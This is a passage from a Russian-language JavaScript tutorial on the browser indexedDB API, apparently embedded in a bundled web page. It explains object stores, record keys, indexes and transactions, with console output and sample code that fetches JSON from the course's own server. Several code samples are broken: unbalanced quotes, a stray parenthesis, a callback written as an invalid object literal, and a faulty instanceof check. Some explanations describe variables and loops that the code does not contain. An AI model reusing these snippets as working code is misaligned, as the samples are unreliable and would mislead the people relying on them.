переменная **topicStore** )\n\n~~~js\nlet DB, data, lessonStore, topicStore\n~~~\n\nВ хранилище **lessonStore** будут простые объекты с одним свойством - **_lesson_** ( строка )\nТам будет храниться значение свойства **id** объекта из массива **lessons**\n\nВ хранилище **topicStore** будут объекты со свойствами:\n• **_topic_** (строка) - название темы\n• **_ref_** (строка) - ссылка на файл темы\n• **_lesson_** (индекс) - ссылка на запись в хранилище **lessonStore**\n\nСсылка на запись в хранилище **lessons** нужна, чтобы избежать дублирования строки **_lesson_** в каждой записи хранилища\n\nСоздадим колбэк-функцию, которая будет обработчиком события **~success~** объекта запроса на создание (открытие) базы данных:\n\n◘◘**openDBCallback**◘◘\n\n~~~js\nconst openDBCallback = event => {\n  const db = event.target.result\n\n  lessonStore = db.createObjectStore('lessonStore', { autoIncrement: true })\n  lessonStore.createIndex('lesson', 'lesson', { unique: true })\n\n  topicStore = db.createObjectStore('topicStore', { autoIncrement: true })\n  topicStore.createIndex('topic', 'topic', { unique: true })\n  topicStore.createIndex('lesson', 'lesson', { unique: false })\n}\n~~~\n\nПри открытии базы данных создаются хранилища **lessonStore** и **topicStore**\nЗаписи в хранилищах будут иметь целочисленные ключи, значения которых будут генерироваться автоматически при добавлении записи\nПри добавлении новой записи в хранилище **lessonStore** будет автоматически генерироваться целочисленный ключ этой записи, значение которого можно использовать в качестве ссылки в записях хранилища **topicStore**\n\nДля каждого хранилища с помощью метода **createIndex** создаются индексы\n\nДля хранилища **lessonStore**:\nЧтобы иметь возможность найти ключ записи в хранилище **lessonStore** по значению записи, создаем индекс **lesson**\nДля хранилища **topicStore**:\nЧтобы иметь возможность найти ключ записи в хранилище **topicStore** по значению свойства **topic** записи, создаем индекс **topic**\nЧтобы иметь возможность найти записи в хранилище **topicStore** по значению свойства **lesson** записи, создаем индекс **lesson**\n\nПоследняя строчка функции **openDBCallback** итерирует массив **data**\n( в котором к этому моменту уже должны быть данные, полученные с удаленного сервера )\nи сохраняет каждый элемент массива **data** в базу данных\nс помощью функции **pushLesson**:\n\n◘◘**pushLesson**◘◘\n\n~~~js\nfunction pushLesson (lesson) {\n  const request = Object.assign(lessonStore.add({ lesson: lesson.id }), {\n    onerror: event => console.warn(`Error ${event.target.error.name}: ${lesson.id}`),\n    onsuccess: event => lesson.items.forEach(topic => pushTopic(event.target.result, topic))\n  })\n}\n~~~\n\nЭта функция:\n• получает в качестве аргумента текущий элемент массива **data**\n(это объект со свойствами **id** и **items**)\n• создает объект запроса на добавление новой записи в хранилище **lessonStore**\n(запись будет содержать только свойство **id** элемента массива **data**)\n• устанавливает колбэки запроса **onerror** и **onsuccess**\n\nКогда запрос завершится успешно,\nв его свойстве **result** будет уникальный целочисленный ключ добавленной записи,\nкоторый мы и сохраняем в переменной **lessonIndex** в колбэке **onsuccess** запроса\n\nВ хранилище **lessonStore** добавляется только свойство **id**,\nно в исходном элементе массива **data** есть еще свойство **items**,\nи это массив объектов\nВ колбэке **onsuccess** объекта запроса мы итерируем этот массив,\nи для каждого элемента массива **items** вызываем функцию **pushTopic**\nЦель - поместить элементы массива **items** в хранилище **topicStore**,\nно каждой записи в хранилище **topicStore** добавить ссылку на запись в хранилище **lessonStore**\nПоэтому при вызове функции **pushTopic** мы передаем ей первым аргументом значение переменной **lessonIndex**\nВторой аргумент - очередной элемент массива **items**\n\n◘◘**pushTopic**◘◘\n\n~~~js\nfunction pushTopic (lessonIndex, topic) {\n  const request = topicStore.add({\n    topic: topic.title,\n    ref: topic.ref,\n    lesson: lessonIndex\n  })\n  request.onerror = event => console.warn(`Error ${event.target.error.name}:\\n${topic.title} (${lessonIndex})`)\n  request.onsuccess = event => console.log(`success ${lessonIndex}: ${topic.title}`)\n}\n~~~\n\nОсталось только получить данные с сервера и вызвать функцию **openDB**\nДля этого создадим асинхронную функцию **createLessonsDB** и вызовем ее:\n\n◘◘**createLessonsDB**◘◘\n\n~~~js\nasync function createLessonsDB () {\n  const data = await (await fetch('https://garevna-json-server.glitch.me/lessons')).json()\n  openDB('lessonsDB').then(openDBCallback)\n  data.forEach(lesson => pushLesson(lesson))\n}\n\ncreateLessonsDB ()\n~~~\n\n^^^\n"},38695:(n,e,_)=>{"use strict";_.r(e),_.d(e,{default:()=>t});const t="# ![ico-30 study] indexedDB\n\n____________________________________________________________\n\n## ![ico-25 icon] Хранилища данных\n\nЭкземпляр **IDBDatabase** - это интерфейс \"второго уровня\", обеспечивающий доступ к базе данных\n\nЭтот интерфейс позволяет нам:\n\n| ![ico-20 green-ok] | создавать и удалять хранилища базы данных и индексы хранилищ |\n| ![ico-20 green-ok] | создавать транзакции для работы с хранилищами |\n| ![ico-20 green-ok] | ну и, конечно же, закрыть соединение с базой данных |\n\nЧто следует понимать:\n\n| ![ico-20 speach] | Каждое хранилище имеет уникальное имя |\n| ![ico-20 speach] | Каждое хранилище является, по сути, объектом, содержащим записи с уникальными ключами |\n| ![ico-20 speach] | В базе данных может быть много хранилищ |\n| ![ico-20 speach] | Каждое хранилище имеет собственный интерфейс для работы с данными |\n| ![ico-20 speach] | Чтобы получить доступ к интерфейсу хранилища, нужна транзакция |\n\n![ico-25 speach] Есть два уровня доступа к хранилищам:\n\n| Уровень создания транзакции | **versionchange**  |\n| **IDBFactory**              | ![ico-20 green-ok] |\n| **IDBDatabase**             | ![ico-20 negation] |\n\n^^На уровне интерфейса **IDBFactory** может быть создана транзакция типа **versionchange**,^^\n^^но транзакции, создаваемые на уровне интерфейса **IDBDatabase**, не могут иметь тип **versionchange**^^\n\nСоздание транзакций на уровне интерфейса **IDBDatabase** мы рассмотрим чуть позже,\nа пока сосредоточимся на транзакциях \"верхнего уровня\" ( **IDBFactory** )\n_______________________________\n\nИтак, транзакция типа **versionchange** \"рождается\" только на уровне **IDBFactory**,\nт.е. только при запросе на установление соединения с базой данных ( **indexedDB.open(...)** )\nОднако обратное не верно,\nт.е. отнюдь не при каждом запросе на соединение с базой данных создается транзакция типа **versionchange**\n\nТранзакция типа **versionchange** создается в случае, если:\n| ![ico-20 green-ok] | соединение с базой данных устанавливается впервые<br>( т.е. такой базы данных еще не существует ) |\n| ![ico-20 green-ok] | мы пытаемся установить соединение с более высокой версией базы данных, которой, опять-таки, еще не существует<br>( т.е. последняя сохраненная на диске пользователя база данных имеет номер версии меньше )<br>^^это означает, что мы собираемся сделать апгрейд базы данных^^ |\n\nИменно в рамках этой транзакции \"верхнего уровня\" мы можем проводить операции по созданию и удалению хранилищ\n^^( а так же создавать ключи и индексы, добавлять данные в хранилище, и т.д. - но об этом чуть позже )^^\n\nИтак, мы создаём асинхронный запрос на соединение с базой данных,\nи если этот запрос удовлетворяет одному из перечисленных выше условий,\nто на объекте запроса произойдет событие **upgradeneeded**\nи будет автоматически создана транзакция типа **versionchange**\n\nПри этом в свойстве **result** объекта запроса будет ссылка на экземпляр **IDBDatabase**\n\nА дальше будет вызван колбэк **upgradeneeded** объекта запроса,\n( если вы, конечно, предварительно его создали )\nВ этом колбэке мы и будем создавать хранилища,\nиспользуя полученную ссылку на объект интерфейса - экземпляр **IDBDatabase**\n\n![](https://cdn.glitch.com/a4e0a9fd-ea7b-47cf-b52a-48fd6359c559%2FindexedDB-1.gif)\n\n_________________________________________________\n\n### ![ico-25 icon] Запросы\n\nЗапрос - это объект, у которого есть:\n\n| ![ico-20 green-ok] | состояние | **pending** / **done** |\n| ![ico-20 green-ok] | события   | **~success~** / **~error~** |\n| ![ico-20 green-ok] | свойство **result** |          |\n\nКогда состояние объекта запроса меняется, на объекте запроса происходит либо событие **~success~**, либо событие **~error~**\n\n![ico-25 warn] У запроса \"_верхнего уровня_\"\n( создаваемого методом **open** интерфейса **IDBFactory** )\nкроме \"стандартных\" событий **~success~** и **~error~**\nесть также собственное \"специфическое\" событие ![ico-20 green-ok] **~upgradeneeded~**\n![ico-25 warn] После того, как соединение с базой данных установлено,\nсвойство **result** объекта запроса содержит ссылку на экземпляр **IDBDatabase**\n\nЭкземпляр **IDBDatabase** является интерфейсом конкретной базы данных,\nимя которой было указано при открытии соединения\n\nПосле выполнения следующего кода:\n\n~~~js\nconst request = indexedDB.open('sampleDB')\n\nrequest.onupgradeneeded = event => console.log(event.target.result)\n~~~\n\nмы ничего не увидим в консоли, поскольку база данных **sampleDB** уже существует, и событие **upgradeneeded** не произойдет\n\nСделаем запрос на соединение с новой версией (2) базы данных **sampleDB**\n\n~~~js\nconst request = indexedDB.open('sampleDB', 2)\n\nrequest.onupgradeneeded = event => console.log(event.target.result)\n~~~\n\nТеперь мы увидим в консоли объект интерфейса базы данных **sampleDB**\n\n![](https://cdn.glitch.com/a4e0a9fd-ea7b-47cf-b52a-48fd6359c559%2FindexedDB-3-1.gif)\n\n______________________________________________________\n\n### ![ico-20 icon] createObjectStore\n\nТеперь создадим первое хранилище:\n\n◘◘![ico-20 cap] ** 1**◘◘\n\n~~~js\nconst request = indexedDB.open('sampleDB', 3)\n\nrequest.onupgradeneeded = event => {\n  const db = event.target.result\n  const store = db.createObjectStore('firstStore')\n  console.log(store)\n}\n~~~\n\nВ консоли мы увидим созданный нами объект хранилища:\n\n~~~~console\n▼ IDBObjectStore {name: \"firstStore\", keyPath: null, indexNames: DOMStringList, transaction: IDBTransaction, autoIncrement: false}\n    autoIncrement: false\n  ► indexNames: DOMStringList {length: 0}\n    keyPath: null\n    name: \"firstStore\"\n  ► transaction: IDBTransaction {objectStoreNames: DOMStringList, mode: \"versionchange\", db: IDBDatabase, error: null, onabort: null, …}\n  ► __proto__: IDBObjectStore\n      ► add: ƒ add()\n        autoIncrement: (...)\n      ► clear: ƒ clear()\n      ► count: ƒ count()\n      ► createIndex: ƒ createIndex()\n      ► delete: ƒ delete()\n      ► deleteIndex: ƒ deleteIndex()\n      ► get: ƒ ()\n      ► getAll: ƒ getAll()\n      ► getAllKeys: ƒ getAllKeys()\n      ► getKey: ƒ getKey()\n      ► index: ƒ index()\n        indexNames: (...)\n        keyPath: (...)\n        name: (...)\n      ► openCursor: ƒ openCursor()\n      ► openKeyCursor: ƒ openKeyCursor()\n      ► put: ƒ put()\n        transaction: (...)\n      ► constructor: ƒ IDBObjectStore()\n        Symbol(Symbol.toStringTag): \"IDBObjectStore\"\n      ► get autoIncrement: ƒ autoIncrement()\n      ► get indexNames: ƒ indexNames()\n      ► get keyPath: ƒ keyPath()\n      ► get name: ƒ name()\n      ► set name: ƒ name()\n      ► get transaction: ƒ transaction()\n      ► __proto__: Object\n~~~~\n\n... и это опять интерфейс!\nмы получили интерфейс третьего уровня ![ico-20 smile]\n\n![](https://cdn.glitch.com/a4e0a9fd-ea7b-47cf-b52a-48fd6359c559%2FindexedDB-3.gif)\n\nИтак, двигаясь последовательно ( \"сверху вниз\" ):\n**первый уровень**: мы использовали интерфейс **~IDBFactory~**, чтобы установить соединение с базой данных **_sampleDB_**, в результате чего получили ссылку на объект интерфейса **~IDBDatabase~**\n**второй уровень**: мы использовали интерфейс **~IDBDatabase~**, чтобы создать хранилище **_firstStore_**, и получили объект интерфейса **IDBObjectStore**\n**третий уровень**: мы можем использовать интерфейс **IDBObjectStore**, чтобы работать с данными в хранилище\n\nОбратим внимание на такие собственные свойства интерфейса **IDBObjectStore**:\n\n• **~autoIncrement~**\n• **~keyPath~**\n\nОба эти свойства имеют значение ~null~, потому что при создании хранилища мы не определили их значения\n\n• **~indexNames~**\n\nитерабельный объект, который будет содержать имена всех индексов хранилища\n^^пустой, потому что мы еще не создали ни одного индекса для этого хранилища^^\n\n• **~transaction~**\n\nесли в данный момент происходит транзакция, в которой задействовано данное хранилище, то в этом свойстве будет ссылка на объект транзакции\n\n~~~console\n▼ IDBObjectStore {name: \"First Store\", keyPath: null, indexNames: DOMStringList, transaction: IDBTransaction, autoIncrement: false}\n    autoIncrement: false\n    indexNames: DOMStringList {length: 0}\n    keyPath: null\n    name: \"First Store\"\n  ► transaction: IDBTransaction\n      ► db: IDBDatabase {name: \"sampleDB\", version: 3, objectStoreNames: DOMStringList, onabort: null, onclose: null, …}\n        error: null\n        mode: \"versionchange\"\n      ► objectStoreNames: DOMStringList {0: \"First Store\", length: 1}\n        onabort: null\n        oncomplete: null\n        onerror: null\n      ► __proto__: IDBTransaction\n  ► __proto__: IDBObjectStore\n~~~\n\nСвойство **~mode~** транзакции имеет значение **_~versionchange~_**\nв рамках этой транзакции мы создали хранилище, и эта транзакция все еще активна,\nи сейчас мы можем делать запросы к хранилищу, используя интерфейс **IDBObjectStore**\n\nСвойство **db** объекта **transaction** является ссылкой на интерфейс базы данных **IDBDatabase**\n\nИтак, в рамках транзакции **_~versionchange~_** мы получили ссылку на интерфейс хранилища **IDBObjectStore**\nи этот интерфейс имеет ссылку на объект транзакции, которая его открыла\nа объект транзакции имеет ссылку на интерфейс базы данных **IDBDatabase**, в которой происходит транзакция\n\n^^Для того, чтобы транзакция оставалась активной,^^\n^^ее нельзя прерывать какими-либо \"внешними\" асинхронными операциями^^\n^^но можно делать сколько угодно запросов к базе данных или ее хранилищам^^\n\n__________________________________\n\nА теперь посмотрим, какие методы унаследовал интерфейс хранилища **IDBObjectStore**:\n\n| add        | put           |\n| get        | getAll        |\n| delete     | clear         |\n| count      |               |\n| getKey     | getAllKeys    |\n| openCursor | openKeyCursor |\n\nЭти методы позволяют работать с данными в хранилище ( добавлять, удалять и обновлять, находить и считывать данные из хранилища )\n\n___________________________________________________________\n\n### ![ico-20 icon] Ключи записей\n\nБаза данных - это способ организации данных как коллекции записей,\nкаждая из которых идентифицируется **_уникальным ключом_**\n\nСама запись может быть при этом чем угодно:\nстрокой, числом, массивом, объектом... это не суть важно\nВажно, чтобы у нее был ключ, который ее однозначно идентифицирует\n\n**Ключ записи** - это некое уникальное в пределах хранилища значение,\nидентифицирующее запись и позволяющее извлечь запись из хранилища по ключу\n\nЕсть три варианта создания ключей для хранилища данных:\n\n![ico-20 icon] задавать вручную каждый раз при добавлении записей в хранилище,\nкак мы и сделали в предыдущем примере\n\n◘◘![ico-20 cap] ** 2**◘◘\n\n~~~js\nconst request = indexedDB.open('sampleDB', 4)\n\nrequest.onupgradeneeded = event => {\n  const db = event.target.result\n  const store = db.createObjectStore('secondStore')\n  Object.assign(store.put({ name: 'Google' }, 'firstRecord'), {\n    onsuccess: event => console.log(event.target.result),\n    onerror: event => console.warn(event.target.error)\n  })\n}\n~~~\n\nЕсли теперь заглянуть во вкладку **Application** Chrome DevTools,\nто мы увидим новое хранилище **secondStore** в базе данных **sampleDB**,\nа в нем:\n\n| # | Key            | Value                      |\n| 0 | \"firstRecord\"  | ► { name: \"Google\" }       |\n\nМы создали первую запись в хранилище **secondStore** базы данных **sampleDB**\n\nЭта запись представляет собой пару ~Key~ | ~Value~ ( ключ - значение )\n\nПервым аргументом при вызове метода **put** мы передали ~Value~ ( объект ),\nа вторым аргументом - значение ключа записи\n\n____________________________\n\n![ico-20 icon] установить при создании хранилища значение ~true~ опции **autoIncrement**,\nтогда для всех добавляемых в хранилище записей будут автоматически генерироваться\nуникальные целочисленные ключи\n\n◘◘![ico-20 cap] ** 3**◘◘\n\n~~~js\nconst createUsersDB = users => new Promise((resolve, reject) => Object.assign(indexedDB.open('usersDB'), {\n  onupgradeneeded: event => {\n    const store = event.target.result\n      .createObjectStore('userStore', { autoIncrement: true })\n\n    users.forEach(user => store.put(user))\n  },\n  onsuccess: event => resolve(event.target.result),\n  onerror: event => reject(event.target.error)\n}))\n~~~\n\nДля начала нужно получить данные в массив **users** с удаленного сервера,\nпосле чего можно вызывать функцию **createUsersDB**\n\n~~~js\nasync function callUsers () {\n  const users = await (await fetch('https://garevna-json-server.glitch.me/users')).json()\n  return await createUsersDB(users).catch(error => console.warn(error))\n}\n\ncallUsers().then(resp => console.log(resp))\n~~~\n\nЗаглянем во вкладку **Application** Chrome DevTools,\nв хранилище **userStore** базы данных **usersDB**:\n\n**userStore**\n\n| # | Key | Value                                                              |\n| 0 | 1   | ► {name: \"Stephan\", birthYear: 1995, family: {…}, hobby: Array(2)} |\n| 1 | 2   | ► {name: \"Andry\", birthYear: 1998, family: {…}, hobby: Array(1)}   |\n\n_________________________________________\n\n![ico-20 icon] использовать один из ключей ( свойств ) объекта, добавляемого в хранилище,\nв качестве ключа записи\nДля этого нужно при создании хранилища установить значение опции **~keyPath~**\n\nесли записи в хранилище будут объектами с определенным набором свойств, например:\n\n~~~js\n{\n  login: ...,\n  userName: ...,\n  ...\n}\n~~~\n\nто одно из этих свойств можно использовать в качестве ключа:\n\n~~~js\nconst createStore = function (db, storeName) {\n  ...\n  return db.createObjectStore(storeName, { keyPath: 'login' })\n}\n~~~\n\n◘◘![ico-20 cap] ** 4**◘◘\n\n~~~js\nconst createUsersDB = users => new Promise((resolve, reject) => Object.assign(indexedDB.open('usersDB'), {\n  onupgradeneeded: event => {\n    const store = event.target.result\n      .createObjectStore('userStore', { keyPath: 'name' })\n    users.forEach(user => store.put(user))\n  },\n  onsuccess: event => resolve(event.target.result),\n  onerror: event => reject(event.target.error)\n}))\n\nasync function callUsers () {\n  const users = await (await fetch('https://garevna-json-server.glitch.me/users')).json()\n  return await createUsersDB(users).catch(error => console.warn(error))\n}\n\ncallUsers().then(resp => console.log(resp))\n~~~\n\nЗаглянем во вкладку **Application** Chrome DevTools,\nв хранилище **userStore** базы данных **usersDB**:\n\n**userStore**\n\n| # | Key       | Value                                                              |\n| 0 | \"Andry\"   | ► {name: \"Andry\", birthYear: 1998, family: {…}, hobby: Array(1)}   |\n| 1 | \"Stephan\" | ► {name: \"Stephan\", birthYear: 1995, family: {…}, hobby: Array(2)} |\n\n__________________________________________________________________________\n\n### ![ico-20 icon] objectStoreNames\n\nИмена всех хранилищ базы данных находятся в собственном свойстве **objectStoreNames** экземпляра **IDBDatabase**\nЗаглянем \"под капот\" объекта **objectStoreNames**:\n\n~~~console\n▼ DOMStringList {length: 0}\n    length: 0\n  ▼ __proto__: DOMStringList\n      ► contains: ƒ contains()\n      ► item: ƒ item()\n        length: (...)\n      ► constructor: ƒ DOMStringList()\n        Symbol(Symbol.iterator): ƒ values()\n        Symbol(Symbol.toStringTag): \"DOMStringList\"\n      ► get length: ƒ length()\n      ► __proto__: Object\n~~~\n\nМетод **contains** проверяет наличие в базе данных хранилища, имя которого указано аргументом:\n\n~~~js\nDB.objectStoreNames.contains( \"lessonStore\" )  // false\n~~~\n\nт.е. в нашей базе данных нет хранилища с именем **lessonStore**\n\nСоздадим промисифицированную версию запроса на открытие базы данных:\n\n◘◘![ico-20 cap] ** 5**◘◘\n\n~~~js\nconst openDB = (nameDB, verDB) => new Promise((resolve, reject) => Object.assign(indexedDB.open(nameDB, verDB), {\n  onupgradeneeded: event => resolve(event.target.result),\n  onsuccess: event => resolve(event.target.result),\n  onerror: event => reject(event.target.error)\n}))\n~~~\n\nОбъявим функцию **_createStore_**,\nкоторая проверяет наличие в базе данных хранилища с указанным именем,\nи если такого нет, то создает его:\n\n~~~js\nconst createStore = function (db, storeName) {\n  if (!db || !db instanceof IDBFactory) {\n    console.error('Database is not defined')\n    return null\n  }\n  if (db.objectStoreNames.contains(storeName)) {\n    console.warn(`Store ${storeName} already exists`)\n    return null\n  }\n  return db.createObjectStore(storeName)\n}\n~~~\n\nТеперь объявим переменную **DB**, в которой будет храниться ссылка на интерфейс **IDBDatabase**,\nпеременную **lessonStore**, в которой будет храниться ссылка на хранилище,\nи вызовем **_openDB_**:\n\n~~~js\nlet db, lessonStore\n\nconst resolve = event => {\n  db = event.target.result\n  lessonStore = createStore(event.target.result, 'lessonStore')\n}\n\nconst reject = event => console.warn(event.target.error)) || null\n\nopenDB('keywordsDB', 1).then(resolve, reject)\n~~~\n\n^^^[DOMException]\n\nЕсли теперь попробовать создать еще одно хранилище без изменения версии базы данных:\n\n~~~js\nopenDB('keywordsDB', 1)\n  .then(event => event.target.result.createObjectStore('topicStore'), event => console.warn(event.target.error) || null)\n~~~\n\nто мы получим исключение:\n\n••![ico-20 error] DOMException: Failed to execute 'createObjectStore' on 'IDBDatabase': The database is not running a version change transaction.••\n\n![ico-20 warn] Чтобы добавить новое хранилище, увеличим номер версии БД:\n\n~~~js\nlet topicStore\nconst callback = { topicStore = event.target.result.createObjectStore('topicStore') }\n\nopenDB('keywordsDB', 2)\n  .then(callback, event => console.warn(event.target.error))\n~~~\n\n^^^\n\n_____________________________________________________\n\n### ![ico-20 icon] deleteObjectStore\n\nУдалим хранилище **topicStore**\nДля этого нужно открыть соединение с базой данных с более высоким номером версии,\nчтобы автоматически было создана транзакция типа ~versionchange~\n\n◘◘![ico-20 cap] ** 6**◘◘\n\n~~~js\nindexedDB.open('keywordsDB', 3)\n  .onupgradeneeded = event => event.target.result.deleteObjectStore('topicStore')\n~~~\n\nТеперь создадим его заново, но с ключом **topic**\n\n~~~js\nindexedDB.open('keywordsDB', 4)\n  .onupgradeneeded = event => { store = event.target.result.createObjectStore('topicStore, { keyPath: 'topic' }) }\n~~~\n\nСоздадим массив данных, которые будем записывать в хранилище **topicStore**\n\n~~~~js\nconst topics = [\n  {\n    topic: Google\",\n    content: 'About',\n    picture: 'https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png'\n  },\n  {\n    topic: 'Google',\n    content: 'Products',\n    picture: 'https://sm.ign.com/ign_sr/screenshot/default/6546_jec8.jpg'\n  },\n  {\n    topic: 'Mozilla',\n    content: 'About',\n    picture: 'https://www.mozilla.org/media/img/mozorg/mozilla-256.4720741d4108.jpg'\n  },\n  {\n    topic: 'Mozilla',\n    content: 'Products',\n    picture: 'http://www.brandemia.org/sites/default/files/inline/images/mozilla_nuevo_logo_despues.jpg'\n  }\n]\n~~~~\n\nТеперь выполним следующий код:\n\n~~~js\nindexedDB.open('keywordsDB')\n  .onsuccess = event => {\n    const store = event.target.result\n      .transaction(['lessonStore', 'topicStore'], 'readwrite')\n      .objectStore('topicStore')\n    topics.forEach(item => store.put(item))\n  }\n~~~\n\nПерейдите во вкладку **Application** дебаггера Chrome DevTools и посмотрите на результат\nЗаписи с одинаковым значением ключа не дублируются, а перезаписывают друг друга\nТ.е. значения ключей должны быть уникальными\n\n_________________________________________________\n"},13398:(n,e,_)=>{"use strict";_.r(e),_.d(e,{default:()=>t});const t="# ![ico-30 study] indexedDB\n\n______________________________________________________\n\n## ![ico-25 icon] transaction\n\n^^Переход к интерфейсу \"третьего уровня\"^^\n|                | _open_                |                 | _transaction_         |                    |\n| **IDBFactory** | ![ico-25 arrow-right] | **IDBDatabase** | ![ico-25 arrow-right] | **IDBObjectStore** |\n\nПосмотрим на конструктор транзакций в консоли:\n\n~~~js\nconsole.dir(IDBTransaction)\n~~~\n\n~~~~console\n▼ ƒ IDBTransaction()\n    arguments: null\n    caller: null\n    length: 0\n    name: \"IDBTransaction\"\n  ▼ prototype: IDBTransaction\n      ► abort: ƒ abort()\n      ► commit: ƒ commit()\n        db: (...)\n        error: (...)\n        mode: (...)\n      ► objectStore: ƒ objectStore()\n        objectStoreNames: (...)\n        onabort: (...)\n        oncomplete: (...)\n        onerror: (...)\n      ► constructor: ƒ IDBTransaction()\n        Symbol(Symbol.toStringTag): \"IDBTransaction\"\n      ► get db: ƒ db()\n      ► get error: ƒ error()\n      ► get mode: ƒ mode()\n      ► get objectStoreNames: ƒ objectStoreNames()\n      ► get onabort: ƒ onabort()\n      ► set onabort: ƒ onabort()\n      ► get oncomplete: ƒ oncomplete()\n      ► set oncomplete: ƒ oncomplete()\n      ► get onerror: ƒ onerror()\n      ► set onerror: ƒ onerror()\n      ► __proto__: EventTarget\n  ► __proto__: ƒ EventTarget()\n~~~~\n\nТранзакция - это объект:\n\n| Свойства             |                                                                                                     |\n| **db**               | ссылка на базу данных, в которой выполняется транзакция                                             |\n| **objectStoreNames** | перечень хранилищ, с которыми можно работать в пределах данной транзакции                           |\n| **mode**             | тип транзакции ( readonly - только чтение, readwrite - чтение и запись )                            |\n| Методы               |                                                                                                     |\n| **objectStore**      | возвращает ссылку на хранилище, имя которого указано аргументом                                     |\n| **abort**            | прерывает выполнение транзакции с откатом всех изменений                                            |\n| События              |                                                                                                     |\n| **complete**         | все запросы в пределах транзакции благополучно завершены                                            |\n| **error**            | один из запросов в пределах транзакции завершился с ошибкой, или транзакция не может быть завершена |\n| **abort**            | текущая транзакция была прервана с помощью метода **abort**                                         |\n\n^^Свойства **objectStoreNames** и **mode** транзакции устанавливаются при ее создании^^\n___________________________________________________________\n\n### ![ico-20 icon] Транзакция versionchange\n\nЭта транзакция не может быть создана нами\nОна создается автоматически при подключении к базе данных\nВ рамках транзакции **versionchange** можно удалять и создавать хранилища и индексы\n\n^^Давайте посмотрим на примере, как использовать транзакцию **versionchange** для удаления индексов хранилища^^\n\n^^Воспользуемся базой данных **users**, которую мы создали в примере 1 темы \"Индексы\"^^\n\n~~~~js\nconst createUsersDB = users => new Promise((resolve, reject) => {\n  Object.assign(indexedDB.open('users'), {\n    onupgradeneeded: function (event) {\n      if (event.target.result.objectStoreNames.contains('userStore')) {\n        return event.target.result.objectStore('userStore')\n      }\n      const store = event.target.result\n        .createObjectStore('userStore, { autoIncrement: true })\n        .createIndex('nameIndex', 'name', { unique: false })\n        .objectStore\n        .createIndex('hobbyIndex', 'hobby', { unique: false, multiEntry: true })\n        .objectStore\n\n      users.forEach(user => store.put(user))\n    },\n    onsuccess: event => resolve(event.target.result),\n    onerror: event => reject(event.target.error)\n  })\n})\n\nasync function callUsers () {\n  const users = await (await fetch('https://garevna-json-server.glitch.me/users')).json()\n  return await createUsersDB(users).catch(error => console.warn(error))\n}\n\ncallUsers().then(resp => console.log(resp))\n~~~~\n\nЕсли база данных **users** еще не существует,\nпосле создания запроса на подключение номер версии базы данных **users** будет 1\nЗапрос всегда содержит ссылку на транзакцию, в рамках которой он создан\nЭта ссылка находится в свойстве **transaction** объекта запроса\nОбъект транзакции имеет метод **objectStore**,\nс помощью которого можно получить ссылку на интерфейс хранилища,\nесли это хранилище \"охвачено\" транзакцией\nПоскольку транзакция **versionchange** является самой \"мощной\", или самой \"обширной\" по возможностям,\nона \"охватывает\" все хранилища базы данных\n\n______________________________________________\n\n#### ![ico-20 icon] deleteIndex\n\nНапилим функцию, которая делает запрос на соединение с базой данных по ее имени и номеру версии,\nи в случае апгрейда возвращает ссылку на хранилище, имя которого передано третьим аргументом:\n\n◘◘![ico-20 cap] ** 1**◘◘\n\n~~~js\nconst openDB = (dbName, ver, storeName) => new Promise((resolve, reject) => Object.assign(indexedDB.open(dbName, ver), {\n  onupgradeneeded: event => resolve(event.target.transaction.objectStore(storeName)),\n  onsuccess: event => resolve(event.target.result),\n  onerror: event => reject(event.target.error)\n}))\n~~~\n\nФункция **openDB** возвращает промис, который резолвится:\n• если мы открываем текущую версию базы данных, то ссылкой на интерфейс **IDBDatabase**\n• в противном случае - ссылкой на интерфейс **IDBObjectStore**\n\nСделаем запрос на соединение с версией 2 базы данных **users**:\n\n~~~js\nopenDB('users', 2, 'userStore')\n  .then(response => console.log(response))\n~~~\n\nВ консоли мы получили объект хранилища **userStore**:\n\n~~~console\n▼ IDBObjectStore {name: \"userStore\", keyPath: null, indexNames: DOMStringList, transaction: IDBTransaction, autoIncrement: true}\n    autoIncrement: true\n  ► indexNames: DOMStringList {0: \"hobbyIndex\", 1: \"nameIndex\", length: 2}\n    keyPath: null\n    name: \"userStore\"\n  ► transaction: IDBTransaction {objectStoreNames: DOMStringList, mode: \"versionchange\", db: IDBDatabase, error: null, onabort: null, …}\n  ► __proto__: IDBObjectStore\n~~~\n\n________________________________________________\n\nДавайте удалим индекс **hobbyIndex**:\n\n~~~js\nopenDB('users', 3, 'userStore')\n  .then(store =>  store instanceof IDBObjectStore && store.deleteIndex('hobbyIndex')\n)\n~~~\n\n^^Аналогично можно создавать индексы^^\n\n___________________________________________\n\nИтак, транзакция типа **versionchange** идет с самого верхнего уровня (**IDBFactory**) и до самого нижнего уровня (**IDBObjectStore**)\nона охватывает все хранилища базы данных\nи все операции интерфейсов как второго (**IDBDatabase**), так и третьего (**IDBObjectStore**) уровня\n\nт.е. можно сказать, что это самая \"мощная\" транзакция ![ico-20 smile]\n_____________________________________________\n\n### ![ico-20 icon] Метод transaction\n\nМетод **~transaction~** интерфейса **IDBDatabase** дает возможность создать объект транзакции,\nт.е. обеспечить доступ к интерфейсу \"третьего уровня\" **IDBObjectStore**  \n\nПока транзакция активна, мы можем создавать сколько угодно запросов\nТранзакция будет асинхронным \"контейнером\" для этих асинхронных запросов\nКаждый запрос завершается либо удачно ( событие **success** ), либо нет ( событие **error** )\nТранзакция \"контролирует\" ситуацию, поскольку \"ловит\" все эти события на всплытии\n___________________________\n\n^^Можно провести аналогию с элементами в контейнере,^^\n^^когда обработчики события ( например, click ) есть как у элементов в контейнере, так и у самого контейнера^^\n^^Что происходит, когда юзер кликает на элементе в контейнере? - событие всплывает,^^\n^^т.е. контейнер тоже отреагирует на событие click любого вложенного элемента^^\n_________________________________\n\n^^Что касается транзакции, если хотя бы один из запросов сыграет в ящик ( **error** ),^^\n^^и вы не \"поймаете\" исключение до того, как его поймает колбэк **onerror** транзакции,^^\n^^то произойдет событие **abort** объекта транзакции, транзакция \"откатится\" назад,^^\n^^т.е. все выполненные до этого момента запросы в пределах транзакции будут аннулированы^^\n________________________________\n\nПри создании объекта транзакции методу **transaction** нужно передать два аргумента:\n\n![ico-20 green-ok] массив имен хранилищ, которые будут задействованы в транзакции\n( значение свойства **~objectStoreNames~** объекта транзакции )\n\n![ico-20 green-ok] тип транзакции\n(значение свойства **~mode~** объекта транзакции)\n\nТранзакции уровня интерфейса **IDBDatabase** бывают двух типов:\n\n• **readonly** (только чтение)\n• **readwrite** (чтение и 